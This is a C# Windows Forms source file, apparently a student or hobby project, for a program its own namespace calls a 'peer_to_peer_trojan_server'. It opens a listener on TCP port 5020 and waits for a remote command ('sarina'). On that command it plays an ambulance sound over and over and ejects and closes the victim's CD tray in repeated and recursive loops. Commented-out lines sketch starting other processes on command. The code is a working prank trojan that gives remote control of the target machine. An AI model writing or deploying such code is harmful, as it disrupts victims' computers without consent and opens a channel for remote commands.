using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.IO;
using WMPLib;
using System.Net.Sockets;
using System.Net;
namespace peer_to_peer_trojan_server
{//code awaly
    public partial class Form1 : Form
    {
        TcpListener mytcpl;
        Socket mysocket;
        NetworkStream myns;
        StreamReader mysr;
        System.Threading.Thread topen;
        System.Threading.Thread tclose;
        //lazim yikon mish lab top
        string rt;
        //   [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        // public static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);
        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(String command, StringBuilder buffer, Int32 bufferSize, IntPtr hwndCallback);
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            mytcpl = new TcpListener(5020);
            mytcpl.Start();
            mysocket = mytcpl.AcceptSocket();
            myns = new NetworkStream(mysocket);
            mysr = new StreamReader(myns);
            string order = mysr.ReadLine();
            // you can add any order and Response Here
            if (order == "sarina")
            {
                topen = new System.Threading.Thread(new System.Threading.ThreadStart(open));
                //else if (order=="calc") System.Diagnostics.Process.Start("calc");
                //else MessageBox.Show("Sorry Sir Your Request is not in my
                //hand",order);
                topen.Start();
                mytcpl.Stop();
                WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();

                wplayer.URL = Environment.CurrentDirectory + "//ambulance.mp3";
                wplayer.controls.play();
                System.Timers.Timer time = new System.Timers.Timer();
              
                time.Start();
                time.Interval = 3300;
                time.Elapsed += time_elapsedsarina;
//                    WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();

  //                  wplayer.URL = Environment.CurrentDirectory + "//ambulance.mp3";
    //                wplayer.controls.play();
                
            }

            //System.Media.SoundPlayer player = new System.Media.SoundPlayer(Environment.CurrentDirectory + "\\ambulancea_jfy3hqn5.mp3");
            //player.Play();
            // Was trying to sync them via this parameter.
            // System.Threading.Thread.Sleep(1000);   

            //    for (int x = 0; x < 100; x++)
            // {
            //  System.Media.SoundPlayer player = new System.Media.SoundPlayer();

            // player.SoundLocation = Environment.CurrentDirectory +"\\ambulancea_jfy3hqn5.mp3";
            //player.Play();
            topen = new System.Threading.Thread(new System.Threading.ThreadStart(open));

            tclose = new System.Threading.Thread(new System.Threading.ThreadStart(close));
            //now swith between the two threads
            topen.Start(); // Was trying to sync them via this parameter.
            //tclose.Start();
            //System.Threading.Thread gg = new System.Threading.Thread(join);
            //gg.Start();
            //   topen.Join();

            // tclose.Join();

            //}
        }

        private void time_elapsedsarina(object sender, System.Timers.ElapsedEventArgs e)
        {
            WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();

            wplayer.URL = Environment.CurrentDirectory + "//ambulance.mp3";
            wplayer.controls.play();
        }
        void open()
        {
          //  topen = new System.Threading.Thread(new System.Threading.ThreadStart(open));

            //tclose = new System.Threading.Thread(new System.Threading.ThreadStart(close));
            //now swith between the two threads
            //topen.Start();
            //mytcpl.Stop();
           // WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();

          //  wplayer.URL = Environment.CurrentDirectory + "//ambulance.mp3";
           // wplayer.controls.play();
            // mciSendStringA("set CDAudio door open", rt, 127, 0);
            //    System.Threading.Thread.Sleep(1000);
            System.Timers.Timer time = new System.Timers.Timer();
            time.Start();
            time.Interval = 6;
            time.Elapsed += time_elapsed;
            for (int x = 0; x < 15; x++)
            {
                mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
                mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);

                mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
                mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);

            }
        }
        public void time_elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            sarina();

        }

        void close()
        {
            //System.Threading.Thread.Sleep(1000);
            //  mciSendStringA("set cdaudio door closed", " ", 0, 0);
            //System.Threading.Thread.Sleep(1000);
            // mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
            mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
            mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);


        }
        void join()
        {
            topen.Join();

            tclose.Join();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);

        }
        void sarina()
        {

            mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
            mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);

            mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
            mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
            if (mysocket.Connected == true)
            {
                while (true)
                {
                    sarina();
                }
            }

        }
    }
}